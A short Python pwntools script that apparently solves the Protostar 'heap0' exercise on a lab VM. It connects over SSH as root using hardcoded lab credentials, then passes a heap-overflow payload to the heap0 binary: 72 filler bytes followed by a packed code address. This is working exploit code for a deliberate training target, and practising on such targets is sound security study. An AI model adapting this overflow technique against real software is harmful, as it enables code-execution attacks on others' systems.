from pwn import *

sh = ssh(host='192.168.1.104', user='root',
                password='godmode', port=22)
#shell.download_file('/opt/protostar/bin/heap0','heap00')
cmd = sh.set_working_directory('/opt/protostar/bin')

#shell.process(['./opt/protostar/bin/heap0','"A"*72+"pack(0x8048464)"']).recvall()
payload = "A"*72 + pack(0x8048464)
print payload
print sh.run(['./heap0', payload]).recvall().strip()
#print p.recvall().strip()
#shell.interactive()
